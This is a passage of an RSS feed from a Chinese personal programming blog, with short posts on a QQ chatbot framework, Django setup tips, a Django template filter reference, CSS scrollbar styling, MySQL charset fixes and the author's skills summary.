<li><a href="http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html">日文版SQL注入速查表发布</a> (<em>v1.1</em>)</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<p>我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件吧</a><em>(ferruh-at-mavituna.com)</em></p>
]]></content>
		</item>
		
		<item>
			<title>个人总结</title>
			<link>https://yinzo.github.io/posts/%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</link>
			<pubDate>Sun, 26 Jul 2015 23:55:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</guid>
			<description>个人总结 记录一下技能树里面的具体内容： 瞎玩Flash VB自学，初二——高一 当时在玩无损，写了个cue文件批量修改与格式化的小软件 C#自学，高</description>
			<content type="html"><![CDATA[<h1 id="个人总结">个人总结</h1>
<!-- raw HTML omitted -->
<p>记录一下技能树里面的具体内容：</p>
<!-- raw HTML omitted -->
<ul>
<li>瞎玩Flash</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>VB自学，初二——高一</p>
<ul>
<li>当时在玩无损，写了个cue文件批量修改与格式化的小软件</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>C#自学，高二——高三</p>
<ul>
<li>高三用C#做出一个舒尔特表格的3×3与5×5版本</li>
</ul>
</li>
<li>
<p>入门Ubuntu</p>
</li>
</ul>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<!-- raw HTML omitted -->
<ul>
<li>自学HTML/CSS/PHP/JavaScript/MySQL</li>
<li>转到Mac平台</li>
<li>建立第一个WordPress博客，自行修改主题。</li>
<li>写出第一个基于JavaScript的小东西：Spin!</li>
<li>一个星期自学JQuery并完成舒尔特表格JS版</li>
<li>入门Python，写出第一个POC，遍历14级新生信息</li>
<li>自学计算机网络</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>课程学习C++，高分过</li>
<li>水了几次CTF，入门了XSS、了解了CSRF、用工具日了几个SQL注入，成功shell</li>
<li>入手Linode1024</li>
<li>使用Django+MySQL完整搭出个人博客</li>
<li>完成学生信息查询系统</li>
<li>为了更便捷的科学上网以及充分利用VPS，搭建Shadowsocks</li>
<li>完成编写SmartQQ-Bot初版</li>
<li>参加（水）华为杯大学生智能大赛，入门机器学习</li>
<li>完成SmartQQ-Bot失物招领版本</li>
<li>C++课程设计，独立使用MySQL+Qt完成数据库+界面，高分过</li>
<li>基本完成SmartQQ-Bot框架的开发</li>
<li>学习《啊哈！算法》</li>
</ul>
<p>现在我在用的好多技能，都还是高三毕业那个两个月的暑假学出来的，当时我的效率简直吓哭，比高三那时候疯的多了，一个星期自学完计算机网络什么的现在简直不敢想，3个小时就坐不住了。</p>
<p>之前放假之前说好的完成TODO_list，现在也就搞了搞SmartQQBot框架跟深入Python，效率不堪直视。嗯现在归纳个人技能表也算做好了:D。</p>
<p>之后几天内差不多该回学校了，一堆一堆的书都等着我呢;P</p>
]]></content>
		</item>
		
		<item>
			<title>基于SmartQQ的Python QQ机器人框架</title>
			<link>https://yinzo.github.io/posts/%E5%9F%BA%E4%BA%8Esmartqq%E7%9A%84python-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6/</link>
			<pubDate>Tue, 21 Jul 2015 15:44:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E5%9F%BA%E4%BA%8Esmartqq%E7%9A%84python-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6/</guid>
			<description>基于SmartQQ的Python QQ机器人框架 这是一个原本是自己在看到某一个QQ群中的机器人后，以娱乐的心态写的一个QQ机器人。登陆部分逻辑</description>
			<content type="html"><![CDATA[<h1 id="基于smartqq的python-qq机器人框架">基于SmartQQ的Python QQ机器人框架</h1>
<!-- raw HTML omitted -->
<p>这是一个原本是自己在看到某一个QQ群中的机器人后，以娱乐的心态写的一个QQ机器人。登陆部分逻辑与代码参考了<a href="https://github.com/xqin/SmartQQ-for-Raspberry-Pi">原名：SmartQQ-for-Raspberry-Pi(PiWebQQV2)</a>这一项目，结合自己的需求写出来的一个以娱乐为主的小玩具。</p>
<p>习惯性地把自己写的小东西发布到Github，意外地发现受到了一定的支持。加上在进一步开发失物招领功能的时候发现代码逻辑有点混乱，于是决定进行一次完全的重构，希望能够开发出一个便于二次开发的QQ机器人框架。</p>
<p>以下为没有重构之前的机器人的README，但是近期（两到三个星期）机器人就将重构，所以以下内容可能会马上过时。</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<hr>
<!-- raw HTML omitted -->
<ul>
<li><code>python QQBot.py</code></li>
<li>等待提示“登陆二维码下载成功，请扫描”，打开脚本所在目录的v.jpg图片扫描二维码。</li>
<li>等待登陆成功的提示&lt;!–+ 登陆成功后出现&rdquo;&gt;&gt;“表示可输入命令，此时私聊问答功能自动激活，群聊各功能需要手动关注该群才会激活，关注群的命令为<code>group 群号</code>，此命令为控制台命令，不是在qq中发送。–&gt;</li>
<li>修改config文件夹中的QQBot_default.conf配置文件</li>
<li>群聊各功能需要在groupCheckList中添加群号，每行一个，来关注群以激活群功能。</li>
</ul>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted -->注：以下命令皆是在qq中发送，群聊命令发送到所在群中<!-- raw HTML omitted --></p>
<ul>
<li></li>
</ul>
<pre><code>群聊学习功能，类似于小黄鸡，在群中通过发送`` !learn {ha}{哈哈} ``语句，则机器人检测到发言中包含“ha”时将自动回复“哈哈”。`` !delete {ha}{哈哈} ``可以删除该内容。学习内容会自动储存在`` groupReplys ``目录中群号.save文件
</code></pre>
<ul>
<li></li>
</ul>
<pre><code>群聊复读功能，检测到群聊中___连续两个___回复内容相同，将自动复读该内容1次。
</code></pre>
<ul>
<li></li>
</ul>
<pre><code>群聊关注功能，使用命令`` !follow qq号 ``可以使机器人复读此人所有发言（除命令外）使用命令`` !unfollow qq号 ``解除关注。qq号处可使用&quot;me&quot;来快速关注与解除关注自己，例：`` !follow me ``
</code></pre>
<ul>
<li></li>
</ul>
<pre><code>私聊问答功能，可以自定义机器人私聊时提出问题，并可储存对方的回复，一般用于自动问卷调查。
</code></pre>
<!-- raw HTML omitted -->
<ul>
<li>
<p>logging模块优化分离，保证主程序无任何print输出。私聊与群消息提醒使用单独的文件输出。</p>
</li>
<li>
<p>细化配置项（tucao_auth = (all/self/custom/none)）</p>
</li>
<li>
<p>tucao内容储存优化，使用cPickle库</p>
</li>
<li>
<p>工程模块化重构</p>
</li>
<li>
<p>群成员外号表</p>
</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>煎蛋无聊图排行生成器</title>
			<link>https://yinzo.github.io/posts/%E7%85%8E%E8%9B%8B%E6%97%A0%E8%81%8A%E5%9B%BE%E6%8E%92%E8%A1%8C%E7%94%9F%E6%88%90%E5%99%A8/</link>
			<pubDate>Wed, 14 Jan 2015 17:41:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E7%85%8E%E8%9B%8B%E6%97%A0%E8%81%8A%E5%9B%BE%E6%8E%92%E8%A1%8C%E7%94%9F%E6%88%90%E5%99%A8/</guid>
			<description>煎蛋无聊图排行生成器 Github点这里以下是readme beautifulsoup4 python jandan_pic_ranker.py 之后按照提示输入即可将排行榜页面生成至当前目录 自动存档功能：首次使用会将目标页</description>
			<content type="html"><![CDATA[<h1 id="煎蛋无聊图排行生成器">煎蛋无聊图排行生成器</h1>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted -->Github点这里<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>以下是readme</p>
<hr>
<!-- raw HTML omitted -->
<ul>
<li><code>beautifulsoup4</code></li>
</ul>
<!-- raw HTML omitted -->
<p><code>python jandan_pic_ranker.py</code></p>
<p>之后按照提示输入即可将排行榜页面生成至当前目录</p>
<!-- raw HTML omitted -->
<ul>
<li>自动存档功能：首次使用会将目标页面保存至本地，下一次统计该页面时将自动调用存档</li>
<li>多模式可选：无聊图、妹子图、（即将加入nsfw）</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>给你的 Django1.7 添加 favicon</title>
			<link>https://yinzo.github.io/posts/%E7%BB%99%E4%BD%A0%E7%9A%84-django1.7-%E6%B7%BB%E5%8A%A0-favicon/</link>
			<pubDate>Tue, 16 Dec 2014 20:51:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E7%BB%99%E4%BD%A0%E7%9A%84-django1.7-%E6%B7%BB%E5%8A%A0-favicon/</guid>
			<description>给你的 Django1.7 添加 favicon url(r&#39;^favicon\.ico$&#39;, &#39;django.views.generic.simple.redirect_to&#39;, {&#39;url&#39;: &#39;/static/images/favicon.ico&#39;}), 对于Django1.6以后的版本，django.views.generic.simple这个类已经不存在了，取而代之的</description>
			<content type="html"><![CDATA[<h1 id="给你的-django17-添加-favicon">给你的 Django1.7 添加 favicon</h1>
<!-- raw HTML omitted -->
<pre><code>url(r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),
</code></pre>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>对于Django1.6以后的版本，<code>django.views.generic.simple</code>这个类已经不存在了，取而代之的是<code>django.views.generic.base</code>这个类中的<code>RedirectView</code>这个方法。</p>
<p>所以，对于新的方法，我们可以这么写</p>
<pre><code>(r'^favicon\.ico/$', RedirectView.as_view(url='/static/images/favicon.ico')),
</code></pre>
<p>如果你不喜欢这样，还可以使用第二种方法。<br>
在views.py中这样写一个新方法</p>
<pre><code>from django.shortcuts import redirect

……
def favicon_redirect(request):
        return redirect('/static/images/favicon.ico')
</code></pre>
<p>之后，在urls.py中对于favicon.ico的请求调用这一函数就好了。</p>
<p>如果出现favicon的500错误，你需要在浏览器中直接访问 /favicon.ico 才能看到具体错误内容;D。</p>
]]></content>
		</item>
		
		<item>
			<title>通过 CSS 修改 webkit 浏览器滚动条样式</title>
			<link>https://yinzo.github.io/posts/%E9%80%9A%E8%BF%87-css-%E4%BF%AE%E6%94%B9-webkit-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</link>
			<pubDate>Mon, 15 Dec 2014 21:01:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E9%80%9A%E8%BF%87-css-%E4%BF%AE%E6%94%B9-webkit-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</guid>
			<description>通过 CSS 修改 webkit 浏览器滚动条样式 ::-webkit-scrollbar 滚动条整体部分，可以设置宽度啥的 ::-webkit-scrollbar-button 滚动条两端的按钮 ::-webkit-scrollbar-track 外层轨道 ::-webkit-scrollbar-track-piece 内层滚动槽 ::-webkit-scrollbar-thumb 滚动的滑块 ::-webkit-scrollbar-corner 边角 ::-webkit-resizer 定义右下角拖动块的</description>
			<content type="html"><![CDATA[<h1 id="通过-css-修改-webkit-浏览器滚动条样式">通过 CSS 修改 webkit 浏览器滚动条样式</h1>
<!-- raw HTML omitted -->
<ol>
<li><code>::-webkit-scrollbar </code>滚动条整体部分，可以设置宽度啥的</li>
<li><code>::-webkit-scrollbar-button </code>滚动条两端的按钮</li>
<li><code>::-webkit-scrollbar-track  </code>外层轨道</li>
<li><code>::-webkit-scrollbar-track-piece  </code>内层滚动槽</li>
<li><code>::-webkit-scrollbar-thumb </code>滚动的滑块</li>
<li><code>::-webkit-scrollbar-corner </code>边角</li>
<li><code>::-webkit-resizer </code>定义右下角拖动块的样式</li>
</ol>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p><img src="http://ww3.sinaimg.cn/large/7d52f1ffjw1enanw086xcj20fu0cgjtk.jpg" alt="滚动条图解"></p>
<p>上面是滚动条的主要几个设置属性，还有更详尽的CSS属性</p>
<p><code>:horizontal</code> 水平方向的滚动条</p>
<p><code>:vertical </code>垂直 方向的滚动条</p>
<p><code>:decrement </code>应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。)</p>
<p><code>:increment </code>与decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。)</p>
<p><code>:start </code>伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。</p>
<p><code>:end </code>类似于start伪类，标识对象是否放到滑块的后面。</p>
<p><code>:double-button  </code>该伪类以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。</p>
<p><code>:single-button </code>类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。</p>
<p><code>:no-button </code>用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。</p>
<p><code>:corner-present  </code>用于所有滚动条轨道，指示滚动条圆角是否显示。</p>
<p><code>:window-inactive </code>用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。(在webkit最近的版本中，该伪类也可以用于::selection伪元素。webkit团队有计划扩展它并推动成为一个标准的伪类)</p>
<p>以下是我的滚动条样式代码</p>
<pre><code>::-webkit-scrollbar {
    height:5px;
    width: 5px;
    background-color: white;
}


::-webkit-scrollbar-thumb {
    width:5px;
    background-color: rgb(0, 167, 255);
    box-shadow: 0 0 5px rgb(0, 167, 255);
    border-radius: 20px;
    transition: box-shadow 0.5s;

}
::-webkit-scrollbar-thumb:hover {
    box-shadow: 0 0 10px rgb(0, 167, 255);
}</code></pre>
]]></content>
		</item>
		
		<item>
			<title>为你的 Django 博客添加 Disqus 评论系统</title>
			<link>https://yinzo.github.io/posts/%E4%B8%BA%E4%BD%A0%E7%9A%84-django-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0-disqus-%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/</link>
			<pubDate>Mon, 15 Dec 2014 15:59:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E4%B8%BA%E4%BD%A0%E7%9A%84-django-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0-disqus-%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/</guid>
			<description>为你的 Django 博客添加 Disqus 评论系统 安装 Disqus ,依官方推荐，使用pip自动安装~ 若是没有 pip 也不用着急，去官方下载一份二进制包，然后解压，进入目录安装 修改 setting.py</description>
			<content type="html"><![CDATA[<h1 id="为你的-django-博客添加-disqus-评论系统">为你的 Django 博客添加 Disqus 评论系统</h1>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<hr>
<p>安装 Disqus ,依官方推荐，使用pip自动安装~</p>
<!-- raw HTML omitted -->
<p>若是没有 pip 也不用着急，去<a href="http://pypi.python.org/pypi/django-disqus/">官方下载一份二进制包</a>，然后解压，进入目录安装</p>
<!-- raw HTML omitted -->
<hr>
<p>修改 setting.py ,在 INSTALLED_APPS 中添加 disqus 项并在文件末尾添加两项参数。其中一项就是刚才复制的KEY啦。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<hr>
<p>通过Django Shell 执行以下命令。恩里面的domain和name改成你自己的就好啦。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>我自己在这一步遇到了一个错误，执行<code>Site.objects.all()</code>的时候报错，提示</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>这是由于没有安装django.sites模块造成的。</p>
<p>只需要在 INSTALLED_APPS 中添加这一模块然后 syncdb就好了。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<hr>
<p>修改模板文件，在指定位置添加 Disqus</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>其中第一项必选，加载 disqus ，第二至第四项可选。</p>
<p>后三项分别是</p>
<ol>
<li>显示评论</li>
<li>显示评论数</li>
<li>显示最近评论。</li>
</ol>
<p>其中显示评论数是通过JS修改含data-disqus-identifier=“{{ object.id }}&ldquo;属性的<!-- raw HTML omitted -->标签来显示的。所以记得加上哦。<!-- raw HTML omitted --></p>
<p>以上，就是 Disqus 的安装啦</p>
]]></content>
		</item>
		
		<item>
			<title>Django自定义 Markdown 过滤器</title>
			<link>https://yinzo.github.io/posts/django%E8%87%AA%E5%AE%9A%E4%B9%89-markdown-%E8%BF%87%E6%BB%A4%E5%99%A8/</link>
			<pubDate>Mon, 15 Dec 2014 14:05:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/django%E8%87%AA%E5%AE%9A%E4%B9%89-markdown-%E8%BF%87%E6%BB%A4%E5%99%A8/</guid>
			<description>Django自定义 Markdown 过滤器 附 my_markdown.py 代码 from django import template from markdown import markdown register = template.Library() @register.filter(name=&#39;my_markdown&#39;) def my_markdown(value): return markdown(value)</description>
			<content type="html"><![CDATA[<h1 id="django自定义-markdown-过滤器">Django自定义 Markdown 过滤器</h1>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>附 my_markdown.py 代码</p>
<pre><code>from django import template
from markdown import markdown

register = template.Library()

@register.filter(name='my_markdown')
def my_markdown(value):
        return markdown(value)</code></pre>
]]></content>
		</item>
		
		<item>
			<title>Django前端输入中文后MySQL出现中文乱码</title>
			<link>https://yinzo.github.io/posts/django%E5%89%8D%E7%AB%AF%E8%BE%93%E5%85%A5%E4%B8%AD%E6%96%87%E5%90%8Emysql%E5%87%BA%E7%8E%B0%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</link>
			<pubDate>Mon, 15 Dec 2014 00:20:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/django%E5%89%8D%E7%AB%AF%E8%BE%93%E5%85%A5%E4%B8%AD%E6%96%87%E5%90%8Emysql%E5%87%BA%E7%8E%B0%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</guid>
			<description>Django前端输入中文后MySQL出现中文乱码 注：需完全一致，当初我数据库用的是 gbk , django 用的 utf8 结果依然是乱码，统一成 utf8 后就好了。 附: MySQL 控制台</description>
			<content type="html"><![CDATA[<h1 id="django前端输入中文后mysql出现中文乱码">Django前端输入中文后MySQL出现中文乱码</h1>
<!-- raw HTML omitted -->
<p><em>注：需完全一致，当初我数据库用的是 gbk , django 用的 utf8 结果依然是乱码，统一成 utf8 后就好了。</em></p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>附: MySQL 控制台修改字符集</p>
<p>首先查看当前 MySQL 字符集</p>
<pre><code>mysql&amp;gt; show variables like 'char%';
+--------------------------+----------------------------+
| Variable_name            | Value                      |
+--------------------------+----------------------------+
| character_set_client     | gbk                        |
| character_set_connection | gbk                        |
| character_set_database   | utf8                       |
| character_set_filesystem | binary                     |
| character_set_results    | gbk                        |
| character_set_server     | utf8                       |
| character_set_system     | utf8                       |
| character_sets_dir       | /usr/share/mysql/charsets/ |
+--------------------------+----------------------------+
8 rows in set (0.00 sec)
</code></pre>
<p>然后逐个变量设置</p>
<pre><code>mysql&amp;gt; SET character_set_client='utf8';
mysql&amp;gt; SET character_set_connection='utf8';
mysql&amp;gt; SET character_set_results='utf8';
……</code></pre>
]]></content>
		</item>
		
		<item>
			<title>Django的过滤器们</title>
			<link>https://yinzo.github.io/posts/django%E7%9A%84%E8%BF%87%E6%BB%A4%E5%99%A8%E4%BB%AC/</link>
			<pubDate>Mon, 15 Dec 2014 00:02:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/django%E7%9A%84%E8%BF%87%E6%BB%A4%E5%99%A8%E4%BB%AC/</guid>
			<description>Django的过滤器们 {{ my_text|escape|linebreaks }} 串联：先转义文本到HTML，再转换每行到 标签 {{ bio | truncatewords:“30” }} 显示前30个字 {{ 123|</description>
			<content type="html"><![CDATA[<h1 id="django的过滤器们">Django的过滤器们</h1>
<!-- raw HTML omitted -->
<p>{{ my_text|escape|linebreaks }} 串联：先转义文本到HTML，再转换每行到</p>
<p>标签</p>
<p>{{ bio | truncatewords:“30” }} 显示前30个字</p>
<p>{{ 123|add:“5” }} 给value加上一个数值</p>
<p>{{ “AB&rsquo;CD”|addslashes }} 单引号加上转义号，一般用于输出到javascript中</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>{{ “abcd”|capfirst }} 第一个字母大写</p>
<p>{{ “abcd”|center:“50” }} 输出指定长度的字符串，并把值对中</p>
<p>{{ “123spam456spam789”|cut:“spam” }} 查找删除指定字符串</p>
<p>{{ value|date:“F j, Y” }} 格式化日期</p>
<p>{{ value|default:“(N/A)” }} 值不存在，使用指定值</p>
<p>{{ value|default_if_none:“(N/A)” }} 值是None，使用指定值</p>
<p>{{ 列表变量|dictsort:“数字” }} 排序从小到大</p>
<p>{{ 列表变量|dictsortreversed:“数字” }} 排序从大到小</p>
<p>{% if 92|divisibleby:“2” %} 判断是否整除指定数字</p>
<p>{{ string|escape }} 转换为html实体</p>
<p>{{ 21984124|filesizeformat }} 以1024为基数，计算最大值，保留1位小数，增加可读性</p>
<p>{{ list|first }} 返回列表第一个元素</p>
<p>{{ “ik23hr&amp;jqwh”|fix_ampersands }} &amp;转为&amp;</p>
<p>{{ 13.414121241|floatformat }} 保留1位小数，可为负数，几种形式</p>
<p>{{ 13.414121241|floatformat:“2” }} 保留2位小数</p>
<p>{{ 23456 |get_digit:“1” }} 从个位数开始截取指定位置的1个数字</p>
<p>{{ list|join:“, ” }} 用指定分隔符连接列表</p>
<p>{{ list|length }} 返回列表个数</p>
<p>{% if 列表|length_is:“3” %} 列表个数是否指定数值</p>
<p>{{ “ABCD”|linebreaks }} 用新行用</p>
<p>、<br>
标记包裹</p>
<p>{{ “ABCD”|linebreaksbr }} 用新行用<br>
标记包裹</p>
<p>{{ 变量|linenumbers }} 为变量中每一行加上行号</p>
<p>{{ “abcd”|ljust:“50” }} 把字符串在指定宽度中对左，其它用空格填充</p>
<p>{{ “ABCD”|lower }} 小写</p>
<p>{% for i in “1abc1”|make_list %}ABCDE,{% endfor %} 把字符串或数字的字符个数作为一个列表</p>
<p>{{ “abcdefghijkl”|phone2numeric }} 把字符转为可以对应的数字</p>
<p>{{ 列表或数字|pluralize }} 单词的复数形式，如列表字符串个数大于1，返回s，否则返回空串</p>
<p>{{ 列表或数字|pluralize:“es” }} 指定es</p>
<p>{{ 列表或数字|pluralize:“y,ies” }} 指定ies替换为y</p>
<p>{{ object|pprint }} 显示一个对象的值</p>
<p>{{ 列表|random }} 返回列表的随机一项</p>
<p>{{ string|removetags:“br p div” }} 删除字符串中指定html标记</p>
<p>{{ string|rjust:“50” }} 把字符串在指定宽度中对右，其它用空格填充</p>
<p>{{ 列表|slice:“:2” }} 切片</p>
<p>{{ string|slugify }} 字符串中留下减号和下划线，其它符号删除，空格用减号替换</p>
<p>{{ 3|stringformat:“02i” }} 字符串格式，使用Python的字符串格式语法</p>
<p>{{ “E<!-- raw HTML omitted -->A<!-- raw HTML omitted -->B</p>
<p><!-- raw HTML omitted -->C<!-- raw HTML omitted --></p>
<p>D”|striptags }} 剥去[X]HTML语法标记</p>
<p>{{ 时间变量|time:“P” }} 日期的时间部分格式</p>
<p>{{ datetime|timesince }} 给定日期到现在过去了多少时间</p>
<p>{{ datetime|timesince:“other_datetime” }} 两日期间过去了多少时间</p>
<p>{{ datetime|timeuntil }} 给定日期到现在过去了多少时间，与上面的区别在于2日期的前后位置。</p>
<p>{{ datetime|timeuntil:“other_datetime” }} 两日期间过去了多少时间</p>
<p>{{ “abdsadf”|title }} 首字母大写</p>
<p>{{ “A B C D E F”|truncatewords:“3” }} 截取指定个数的单词</p>
<p>{{ “<!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted -->22<!-- raw HTML omitted -->1<!-- raw HTML omitted -->”|truncatewords_html:“2” }} 截取指定个数的html标<br>
记，并补完整</p>
<p>{{ list|unordered_list }}</p>
<p>多重嵌套列表展现为html的无序列表</p>
<p>{{ string|upper }} 全部大写</p>
<p>[linkage]({{ link|urlencode }}) url编码</p>
<p>{{ string|urlize }} 将URLs由纯文本变为可点击的链接。（没有实验成功）</p>
<p>{{ string|urlizetrunc:“30” }} 同上，多个截取字符数。（同样没有实验成功）</p>
<p>{{ “B C D E F”|wordcount }} 单词数</p>
<p>{{ “a b c d e f g h i j k”|wordwrap:“5” }} 每指定数量的字符就插入回车符</p>
<p>{{ boolean|yesno:“Yes,No,Perhaps” }} 对三种值的返回字符串，对应是 非空,空,None</p>
<p>日期格式化参数：</p>
<p>a ‘a.m.’ 或 ‘p.m.’ (注意,它与PHP 的输出略有不同.它包括了句点(django扩展). ‘a.m.’</p>
<p>A ‘AM’ 或 ‘PM’. ‘AM’</p>
<p>B 未实现.</p>
<p>d 每月第几天, 带前导零 ‘01’ to ‘31’</p>
<p>D 每周第几天,3字母的字符串. ‘Fri’</p>
<p>f 时间, 12-小时制的小时和分钟数, 如果分钟数为零,则不显示.(django 扩展). ‘1’, ‘1:30’</p>
<p>F 月份, 长文本格式. ‘January’</p>
<p>g 小时, 12-小时制,没有前导零 ‘1’ to ‘12’</p>
<p>G 小时, 24-小时制,没有前导零 ‘0’ to ‘23’</p>
<p>h 小时, 12-小时制,有前导零 ‘01’ to ‘12’</p>
<p>H 小时, 24-小时制,有前导零 ‘00’ to ‘23’</p>
<p>i 分钟. ‘00’ to ‘59’</p>
<p>I 未实现</p>
<p>j 每月第几天, 无前导零 ‘1’ to ‘31’</p>
<p>l 每周第几天,长文本格式. ‘Friday’</p>
<p>L 是否闰年. True or False</p>
<p>m 数字表示的月份,有前导零. ‘01’ to ‘12’</p>
<p>M 月份,3字母短文本格式. ‘Jan’</p>
<p>n 数字表示的月份,无前导零 ‘1’ to ‘12’</p>
<p>N 出版风格的月份缩写(django 扩展) ‘Jan.’, ‘Feb.’, ‘March’, ‘May’</p>
<p>O 与格林威治的时间差(以小时计) ‘+0200’</p>
<p>P 12小时制的小时分钟及&rsquo;a.m.‘/&lsquo;p.m.’ 分钟数若为零则不显示. 用字符串表示特殊 的时间点, 如 ‘midnight’ 和 ‘noon’ (django扩展) ‘1 a.m.’, ‘1:30 p.m.’, ‘midnight’,‘noon’, ‘12:30 p.m.’</p>
<p>r RFC 822 格式的日期 . ‘Thu, 21 Dec 2000 16:01:07+0200’</p>
<p>s 秒数, 带有前导零的数字表示 ‘00’ to ‘59’</p>
<p>S 英语序数后缀,用于一个月的第几天,2个字符 ‘st’, ‘nd’, ‘rd’ or ‘th’</p>
<p>t 给定月共有多少天. 28 to 31</p>
<p>T 本机时区. ‘EST’, ‘MDT’</p>
<p>U 未实现</p>
<p>w 一周中的第几天,没有前导零的数字 ‘0’ (Sunday) to ‘6’ (Saturday)</p>
<p>W ISO-8601 一年的第多少星期数, 一周从 星期一开始 1, 23</p>
<p>y Year, 2 位数字表示 ‘99’</p>
<p>Y Year, 4 位数字表示 ‘1999’</p>
<p>z 一年中的第几天 . 0 to 365</p>
<p>Z 以秒计的时区偏移量. 这个偏移量对UTC西部 时区总是负数,而对UTC东部时区则总是正数 -43200 to 43200</p>
]]></content>
		</item>
		
		<item>
			<title>解决OSX升级10.10后无法开启MAMP Apache服务</title>
			<link>https://yinzo.github.io/posts/%E8%A7%A3%E5%86%B3osx%E5%8D%87%E7%BA%A710.10%E5%90%8E%E6%97%A0%E6%B3%95%E5%BC%80%E5%90%AFmamp-apache%E6%9C%8D%E5%8A%A1/</link>
			<pubDate>Sun, 14 Dec 2014 21:26:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E8%A7%A3%E5%86%B3osx%E5%8D%87%E7%BA%A710.10%E5%90%8E%E6%97%A0%E6%B3%95%E5%BC%80%E5%90%AFmamp-apache%E6%9C%8D%E5%8A%A1/</guid>
			<description>解决OSX升级10.10后无法开启MAMP Apache服务 再次打开MAMP即可开启Apache. 原文</description>
			<content type="html"><![CDATA[<h1 id="解决osx升级1010后无法开启mamp-apache服务">解决OSX升级10.10后无法开启MAMP Apache服务</h1>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>再次打开MAMP即可开启Apache.</p>
<p><a href="http://www.jianshu.com/p/ebcbdc5388c5">原文</a></p>
]]></content>
		</item>
		
	</channel>
</rss>
